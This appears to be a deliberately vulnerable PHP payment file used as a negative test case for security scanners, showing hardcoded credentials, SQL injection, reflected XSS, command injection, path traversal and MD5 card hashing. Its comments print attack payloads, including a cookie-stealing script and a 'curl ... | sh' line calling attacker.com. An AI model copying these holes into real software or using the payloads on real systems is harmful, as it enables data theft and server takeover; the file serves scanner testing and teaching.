<?php
// INTENTIONALLY VULNERABLE — demo/negative test case only.
// DO NOT deploy this file anywhere.
//
// Purpose: PHP-specific vulnerability classes caught by CodeQL, Snyk, and OWASP ZAP DAST.
// PHP is common in legacy payment gateways (WooCommerce, Magento, older acquirer SDKs).
//
// What catches each issue:
//   CodeQL (PHP queries) →  CWE-89, CWE-79, CWE-78, CWE-22
//   Snyk DeepCode        →  CWE-798, CWE-327, all of the above
//   OWASP ZAP DAST       →  CWE-79 (XSS detected in HTTP response)
//   Trivy secret scan    →  CWE-798 (hardcoded DB password)
//   pre-commit gitleaks  →  CWE-798 (blocks the commit before it reaches git)
//
// Local scan:
//   trivy fs --scanners secret demo/insecure-code/vulnerable_payment.php
//
// Compare to: demo/insecure-code/secure_payment.php


// ─── CWE-798: Hardcoded Credentials ─────────────────────────────────────────
// These credentials are now permanently in git history.
// Even if you delete them in a future commit the old SHA still has them.
// Trivy, Snyk, and pre-commit gitleaks all detect common credential patterns.
// PCI-DSS Req 8: credentials must be individual, rotatable, and audited —
// hardcoded values satisfy none of those requirements.
$db_host     = 'payments-db.internal';
$db_user     = 'payments_admin';
$db_password = 'P@ymentDB_Sup3rS3cret!';      // VULNERABLE — CWE-798
$api_key     = 'api_key_hardcoded_in_source';  // VULNERABLE — CWE-798 (simulates live API key)


// ─── CWE-89: SQL Injection ───────────────────────────────────────────────────
// $_GET['payment_id'] is concatenated directly into SQL with no sanitisation.
// Attack: GET /payment.php?payment_id=1+OR+1=1
// Result: query returns ALL payments — full cardholder data dump.
// CodeQL traces the taint flow from $_GET to mysql_query() in PHP.
// PCI-DSS Req 6.2.4: injection flaws are explicitly listed as requiring prevention.
function get_payment($conn) {
    $payment_id = $_GET['payment_id'];                               // tainted input
    $query = "SELECT * FROM payments WHERE id = " . $payment_id;    // VULNERABLE — CWE-89
    return mysql_query($query, $conn);
}


// ─── CWE-79: Reflected Cross-Site Scripting (XSS) ────────────────────────────
// $_GET['status'] is echoed directly into the HTML page with no encoding.
// Attack: GET /payment.php?status=<script>fetch('https://attacker.com?c='+document.cookie)</script>
// Result: session cookie exfiltration — attacker hijacks the user's session.
// OWASP ZAP DAST detects this by injecting payloads and inspecting the HTTP response.
// CodeQL flags unencoded output of GET/POST parameters as CWE-79.
function show_payment_status() {
    $status = $_GET['status'];
    echo "<div class='status'>Payment status: " . $status . "</div>";  // VULNERABLE — CWE-79
}


// ─── CWE-78: OS Command Injection ────────────────────────────────────────────
// $amount from user input is passed to a shell command with no validation.
// Attack: amount=100%3B+curl+https%3A%2F%2Fattacker.com%2Fexfil+|+sh
//   (URL-decoded: 100; curl https://attacker.com/exfil | sh)
// Result: arbitrary command execution on the server — data exfiltration or backdoor install.
// CodeQL traces exec()/system()/passthru() calls with unsanitised user input.
function generate_receipt($amount) {
    exec("generate_receipt.sh " . $amount);    // VULNERABLE — CWE-78
}


// ─── CWE-22: Path Traversal / Local File Inclusion (LFI) ─────────────────────
// User controls which template file is included via the query string.
// Attack: GET /payment.php?template=../../etc/passwd
// Result: server file disclosure. With log poisoning, this becomes remote code execution.
// CodeQL flags include()/require() with unsanitised user-controlled path components.
function load_template() {
    $template = $_GET['template'];
    include('/var/www/templates/' . $template . '.php');    // VULNERABLE — CWE-22
}


// ─── CWE-327: Broken or Risky Cryptographic Algorithm ────────────────────────
// MD5 has been broken since 2004 (Wang & Yu, practical collisions).
// Storing cardholder data hashed with MD5 violates PCI-DSS Req 3.4:
// "Render PAN unreadable anywhere it is stored" — MD5 does not qualify.
// Snyk DeepCode flags md5() on payment/card data as a high-severity finding.
function hash_card_number($card_number) {
    return md5($card_number);    // VULNERABLE — CWE-327
}
